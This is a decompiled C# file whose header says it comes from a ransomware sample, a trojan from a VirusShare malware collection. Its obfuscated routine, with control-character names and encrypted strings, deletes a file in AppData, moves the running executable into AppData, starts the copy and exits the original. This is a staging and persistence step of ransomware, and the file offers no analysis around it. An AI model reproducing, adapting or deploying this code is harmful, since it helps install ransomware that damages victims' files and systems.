// Decompiled with JetBrains decompiler
// Type: .
// Assembly: coproccessor, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: 489BB54C-AC64-4776-B7C7-9CD76A5742AF
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-c8a5aa891fc37cf6a3724b7ba25ce00e61d4f00bdc5d5c35ff70f3359185f7f5.exe

using \u0006;
using \u000E;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace \u0006
{
  internal class \u008A\u001A
  {
    public class \u000E\u0004
    {
      [DllImport("kernel32", EntryPoint = "GetModuleFileNameA", CharSet = CharSet.Ansi, SetLastError = true)]
      public static extern int \u009E\u0003(int _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1, int _param2);

      [DllImport("kernel32", EntryPoint = "ExitProcess", CharSet = CharSet.Ansi, SetLastError = true)]
      public static extern int \u0003\u0004([In] uint obj0);

      [DllImport("kernel32", EntryPoint = "MoveFileExW", CharSet = CharSet.Ansi, SetLastError = true)]
      public static extern int \u0004\u0004([MarshalAs(UnmanagedType.LPTStr), In] string _param0, [MarshalAs(UnmanagedType.LPTStr), In] string _param1, long _param2);

      public static void \u0008\u0004()
      {
        try
        {
          if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007\u001E.\u0005\u001E(\u0008.\u0007(3608), \u0008.\u0007(227))))
            File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007\u001E.\u0005\u001E(\u0008.\u0007(3657), \u0008.\u0007(227)));
          string fileName1 = Process.GetCurrentProcess().MainModule.FileName;
          string fileName2 = Process.GetCurrentProcess().MainModule.FileName;
          int Length = \u008A\u001A.\u000E\u0004.\u009E\u0003(0, ref fileName2, 256);
          \u008A\u001A.\u000E\u0004.\u0004\u0004(Strings.Left(fileName1, Length), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007\u001E.\u0005\u001E(\u0008.\u0007(3706), \u0008.\u0007(227)), 8L);
          Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007\u001E.\u0005\u001E(\u0008.\u0007(3755), \u0008.\u0007(227)));
          \u008A\u001A.\u000E\u0004.\u0003\u0004(0U);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }
  }
}
